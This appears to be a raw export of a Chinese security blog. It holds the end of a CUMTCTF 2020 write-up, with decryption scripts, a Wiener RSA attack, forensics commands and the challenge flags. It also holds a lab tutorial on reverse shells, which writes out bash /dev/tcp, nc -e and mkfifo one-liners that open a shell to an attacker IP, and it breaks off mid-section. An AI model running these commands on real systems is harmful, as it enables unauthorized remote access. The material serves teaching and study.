print(chr(ord((b[m]))^c),end=<span class=\"string\">''</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"non-name\"><a href=\"#non-name\" class=\"headerlink\" title=\"non_name\"></a>non_name</h2><p>四元一次方程</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b = [<span class=\"number\">12</span>, <span class=\"number\">32</span>, <span class=\"number\">34</span>, <span class=\"number\">12</span>, <span class=\"number\">53</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">34</span>, <span class=\"number\">45</span>, <span class=\"number\">56</span>, <span class=\"number\">32</span>, <span class=\"number\">85</span>, <span class=\"number\">43</span>]</span><br><span class=\"line\">c = [<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">4</span>):</span><br><span class=\"line\">    sum1 = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">4</span>):</span><br><span class=\"line\">        print(<span class=\"string\">\"%s*%s\"</span>%(b[i*<span class=\"number\">4</span>+j],c[j]),end=<span class=\"string\">'+'</span>)</span><br><span class=\"line\">    print(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"><span class=\"comment\">#116 103 102 114</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h1><h2 id=\"Classical\"><a href=\"#Classical\" class=\"headerlink\" title=\"Classical\"></a>Classical</h2><p>维吉尼亚密码，上网down脚本，猜密钥，跑出来</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cipher = <span class=\"string\">\"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikz’wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izr’m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csg’v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn.\"</span></span><br><span class=\"line\"><span class=\"comment\"># coding: utf-8</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(message, key)</span>:</span></span><br><span class=\"line\">    cipher = <span class=\"string\">''</span></span><br><span class=\"line\">    j = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(message)):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> key[j % len(key)].islower():</span><br><span class=\"line\">            offset = ord(key[j % len(key)]) - ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> key[j % len(key)].isupper():</span><br><span class=\"line\">                offset = ord(key[j % len(key)]) - ord(<span class=\"string\">'A'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                offset = ord(key[j % len(key)]) - <span class=\"number\">48</span></span><br><span class=\"line\"></span><br><span class=\"line\">        j += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> message[i].isalpha():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> message[i].islower():</span><br><span class=\"line\">                cipher += chr((ord(message[i]) - ord(<span class=\"string\">'a'</span>) + offset) % <span class=\"number\">26</span> + ord(<span class=\"string\">'a'</span>))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                cipher += chr((ord(message[i]) - ord(<span class=\"string\">'A'</span>) + offset) % <span class=\"number\">26</span> + ord(<span class=\"string\">'A'</span>))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            cipher += message[i]</span><br><span class=\"line\">            j -= <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> cipher</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(cipher, key)</span>:</span></span><br><span class=\"line\">    explain = <span class=\"string\">''</span></span><br><span class=\"line\">    j = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(cipher)):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> key[j % len(key)].islower():</span><br><span class=\"line\">            offset = ord(key[j % len(key)]) - ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> key[j % len(key)].isupper():</span><br><span class=\"line\">                offset = ord(key[j % len(key)]) - ord(<span class=\"string\">'A'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                offset = ord(key[j % len(key)]) - <span class=\"number\">48</span></span><br><span class=\"line\">        j += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> cipher[i].isalpha():</span><br><span class=\"line\">            <span class=\"keyword\">if</span> cipher[i].islower():</span><br><span class=\"line\">                explain += chr((ord(cipher[i]) - ord(<span class=\"string\">'a'</span>) - offset) % <span class=\"number\">26</span> + ord(<span class=\"string\">'a'</span>))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                explain += chr((ord(cipher[i]) - ord(<span class=\"string\">'A'</span>) - offset) % <span class=\"number\">26</span> + ord(<span class=\"string\">'A'</span>))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            explain += cipher[i]</span><br><span class=\"line\">            j -= <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> explain</span><br><span class=\"line\"></span><br><span class=\"line\">print(decrypt(cipher,<span class=\"string\">'Lethelastctf'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">CUMTCTF&#123;EnjoyTheVigenereCipher&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ezRSA\"><a href=\"#ezRSA\" class=\"headerlink\" title=\"ezRSA\"></a>ezRSA</h2><p>大数e</p>\n<p>可以判断是wiener attack</p>\n<p>上网直接down脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\">Created on Dec 14, 2011</span><br><span class=\"line\"></span><br><span class=\"line\">@author: pablocelayes</span><br><span class=\"line\">&#39;&#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class=\"line\"></span><br><span class=\"line\">def hack_RSA(e,n):</span><br><span class=\"line\">    &#39;&#39;&#39;</span><br><span class=\"line\">    Finds d knowing (e,n)</span><br><span class=\"line\">    applying the Wiener continued fraction attack</span><br><span class=\"line\">    &#39;&#39;&#39;</span><br><span class=\"line\">    frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class=\"line\">    convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class=\"line\">    </span><br><span class=\"line\">    for (k,d) in convergents:</span><br><span class=\"line\">        </span><br><span class=\"line\">        #check if d is actually the key</span><br><span class=\"line\">        if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0:</span><br><span class=\"line\">            phi &#x3D; (e*d-1)&#x2F;&#x2F;k</span><br><span class=\"line\">            s &#x3D; n - phi + 1</span><br><span class=\"line\">            # check if the equation x^2 - s*x + n &#x3D; 0</span><br><span class=\"line\">            # has integer roots</span><br><span class=\"line\">            discr &#x3D; s*s - 4*n</span><br><span class=\"line\">            if(discr&gt;&#x3D;0):</span><br><span class=\"line\">                t &#x3D; Arithmetic.is_perfect_square(discr)</span><br><span class=\"line\">                if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0:</span><br><span class=\"line\">                    print(&quot;Hacked!&quot;)</span><br><span class=\"line\">                    return d</span><br><span class=\"line\"></span><br><span class=\"line\"># TEST functions</span><br><span class=\"line\"></span><br><span class=\"line\">def test_hack_RSA():</span><br><span class=\"line\">    print(&quot;Testing Wiener Attack&quot;)</span><br><span class=\"line\">    times &#x3D; 5</span><br><span class=\"line\">    </span><br><span class=\"line\">    while(times&gt;0):</span><br><span class=\"line\">        e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024)</span><br><span class=\"line\">        print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;)</span><br><span class=\"line\">        print(&quot;d &#x3D; &quot;, d)</span><br><span class=\"line\">    </span><br><span class=\"line\">        hacked_d &#x3D; hack_RSA(e, n)</span><br><span class=\"line\">    </span><br><span class=\"line\">        if d &#x3D;&#x3D; hacked_d:</span><br><span class=\"line\">            print(&quot;Hack WORKED!&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&quot;Hack FAILED&quot;)</span><br><span class=\"line\">        </span><br><span class=\"line\">        print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d)</span><br><span class=\"line\">        print(&quot;-------------------------&quot;)</span><br><span class=\"line\">        times -&#x3D; 1</span><br><span class=\"line\">    </span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class=\"line\">    n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class=\"line\">    e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class=\"line\">    c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span><br><span class=\"line\">    #test_is_perfect_square()</span><br><span class=\"line\">    d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class=\"line\">    m &#x3D; pow(c,d,n)</span><br><span class=\"line\">    def num2str(num):</span><br><span class=\"line\">        tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class=\"line\">        if(len(tmp))%2 &#x3D;&#x3D;0:</span><br><span class=\"line\">            return tmp.decode(&quot;hex&quot;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return (&quot;0&quot;+tmp).decode(&quot;hex&quot;)</span><br><span class=\"line\">    print(num2str(m))</span><br><span class=\"line\">    #print(&quot;-------------------------&quot;)</span><br><span class=\"line\">    #print(hack_RSA(e,n))</span><br><span class=\"line\"></span><br><span class=\"line\">CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h1><h2 id=\"Sign-In\"><a href=\"#Sign-In\" class=\"headerlink\" title=\"Sign In\"></a>Sign In</h2><p>转base64在转brainfk</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"出个流量分析吧\"><a href=\"#出个流量分析吧\" class=\"headerlink\" title=\"出个流量分析吧\"></a>出个流量分析吧</h2><p>http流base64解码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;WirRSharK_S0_E45y&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"出个LSB吧\"><a href=\"#出个LSB吧\" class=\"headerlink\" title=\"出个LSB吧\"></a>出个LSB吧</h2><p>LSB隐写</p>\n<p>red green blue 0 0 0</p>\n<p>保存得二维码 扫得flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"出个伪web吧\"><a href=\"#出个伪web吧\" class=\"headerlink\" title=\"出个伪web吧\"></a>出个伪web吧</h2><p>查看最新修改文件的时间</p>\n<p>可以看到pass中有明显字符串cumt</p>\n<p>然后拿flag包裹就行</p>\n<h2 id=\"出个文档吧\"><a href=\"#出个文档吧\" class=\"headerlink\" title=\"出个文档吧\"></a>出个文档吧</h2><p>隐藏文字</p>\n<h2 id=\"内存取证\"><a href=\"#内存取证\" class=\"headerlink\" title=\"内存取证\"></a>内存取证</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python vol.py -f memory.img imageinfo</span><br><span class=\"line\">python vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag</span><br></pre></td></tr></table></figure>\n<p>可以看到有flag.png，输出一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900</span><br></pre></td></tr></table></figure>\n<p>可以看到一个图片扫一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure>\n<p>解不出来</p>\n<p>查看系统窗口列表，看有没有和flag有关的程序</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag</span><br></pre></td></tr></table></figure>\n<p>可以看到有一个程序dump一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992</span><br></pre></td></tr></table></figure>\n<p>用foremost分离一下</p>\n<p>可以看到有图片</p>\n<p>有key值和vi 然后就是AES加密</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key:Th1s_1s_K3y00000</span><br><span class=\"line\">vi:1234567890123456</span><br><span class=\"line\">base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"出个压缩包吧\"><a href=\"#出个压缩包吧\" class=\"headerlink\" title=\"出个压缩包吧\"></a>出个压缩包吧</h2><p>010打开之后发现有secret.png没有伪加密，很明显子块被修改</p>\n<p>7a改成74</p>\n<p>分离出secret.png</p>\n<p>发现是一张图片，但有两帧</p>\n<p>脱到steg里面可以看到两个残缺的二维码</p>\n<p>补全，就可以看到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>\n","categories":["CTF"],"tags":["WP"]},{"title":"反弹shell总结","url":"https://pz1o.top/2020/10/03/反弹shell总结/","content":"<a id=\"more\"></a>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近遇到反弹shell，总结一下反弹shell，用来做笔记</p>\n<h1 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h1><p>反向Shell指Shell回弹或者叫反射，就是说受害者kali把自己的Shell挂载（或者叫attach更合适）到某个端口上，以此暴露到攻击者win可以连接的位置，攻击者win通过连接该端口最终拿到shell。</p>\n<p><strong>以下实验都为</strong></p>\n<p><strong>kali为被攻击者来模仿服务器</strong></p>\n<p><strong>win为攻击者</strong></p>\n<p>kali（服务端）：192.168.202.129</p>\n<p>win（客户端）：169.254.158.23</p>\n<h2 id=\"bash反弹shell\"><a href=\"#bash反弹shell\" class=\"headerlink\" title=\"bash反弹shell\"></a><strong>bash反弹shell</strong></h2><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/169.254.158.23/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>bash产生了一个交互环境让本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>\n<h3 id=\"实验\"><a href=\"#实验\" class=\"headerlink\" title=\"实验\"></a><strong>实验</strong></h3><p>首先在win上监听8080端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 8080</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>-n: 不反向解析dns，即不通过ip解析域名 no dns</p>\n<p>-v: 详细信息输出 verbose</p>\n<p>-l:  监听 listen</p>\n<p>-p: 指定端口 port</p>\n</blockquote>\n<p>然后再kali上运行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>之后反弹成功</p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205548782.png\" alt=\"image-20201002205548782\"></p>\n<h3 id=\"解释\"><a href=\"#解释\" class=\"headerlink\" title=\"解释\"></a>解释</h3><p>具体各参数的意义</p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205958997.png\" alt=\"image-20201002205958997\"></p>\n<p><strong>linux文件描述符</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 - stdin 代表标准输入,使用&lt;或&lt;&lt;</span><br><span class=\"line\">1 - stdout 代表标准输出,使用&gt;或&gt;&gt;</span><br><span class=\"line\">2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>>&amp;</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</span><br><span class=\"line\">当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">&amp;和&gt;的区别</span></span><br><span class=\"line\">root@kali:/var/www/html# ls  //查看无1.php</span><br><span class=\"line\">flag.php  index.php</span><br><span class=\"line\">root@kali:/var/www/html# cat 1.php 2&gt;1  //将错误内容输入到1文件中</span><br><span class=\"line\">root@kali:/var/www/html# cat 1</span><br><span class=\"line\">cat: 1.php: 没有那个文件或目录</span><br><span class=\"line\">root@kali:/var/www/html# cat 1.php 2&gt;&amp;1  //将错误内容按标准输出出来</span><br><span class=\"line\">cat: 1.php: 没有那个文件或目录</span><br></pre></td></tr></table></figure>\n<ol>\n<li>bash -i 产生一个bash环境</li>\n<li><code>/dev/tcp/ip/port</code>： <code>/dev/tcp/</code>是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上<code>/dev/tcp/ip/port</code>这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出。</li>\n<li><code>0&gt;&amp;1</code>，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了<code>/dev/tcp/ip/port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</li>\n</ol>\n<h2 id=\"nc一句话反弹\"><a href=\"#nc一句话反弹\" class=\"headerlink\" title=\"nc一句话反弹\"></a>nc一句话反弹</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>-e: 指定nc连接成功后执行的程序</p>\n</blockquote>\n<p>无-e的情况下可以执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure>\n<h3 id=\"实验1\"><a href=\"#实验1\" class=\"headerlink\" title=\"实验1\"></a><strong>实验</strong>1</h3><p>首先在win（客户端）上监听7777端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>然后在kali（服务端）上一句话反弹</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>\n<p>反弹成功</p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002211246793.png\" alt=\"image-20201002211246793\"></p>\n<h3 id=\"实验2\"><a href=\"#实验2\" class=\"headerlink\" title=\"实验2\"></a>实验2</h3><p>win上监听端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>kali上执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003140303187.png\" alt=\"image-20201003140303187\"></p>\n<p>反弹成功</p>\n<h2 id=\"curl反弹\"><a href=\"#curl反弹\" class=\"headerlink\" 